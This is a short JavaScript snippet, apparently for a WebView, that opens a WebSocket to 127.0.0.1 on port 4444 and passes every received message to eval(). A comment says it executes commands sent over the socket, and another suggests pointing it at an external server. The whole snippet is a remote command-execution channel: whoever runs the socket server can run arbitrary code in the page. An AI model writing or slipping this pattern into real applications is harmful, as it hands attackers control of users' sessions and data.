var socket = new WebSocket("ws://127.0.0.1:4444"); // Adjust this URL if connecting to an external WebSocket server

socket.onopen = function () {
    console.log("WebSocket connected!");
    socket.send("Hello from WebView!");
};

socket.onmessage = function (event) {
    console.log("Received: " + event.data);

    try {
        eval(event.data); // Attempt to execute commands received via WebSocket
    } catch (e) {
        console.error("Command execution failed:", e);
    }
};

socket.onclose = function () {
    console.log("WebSocket connection closed.");
};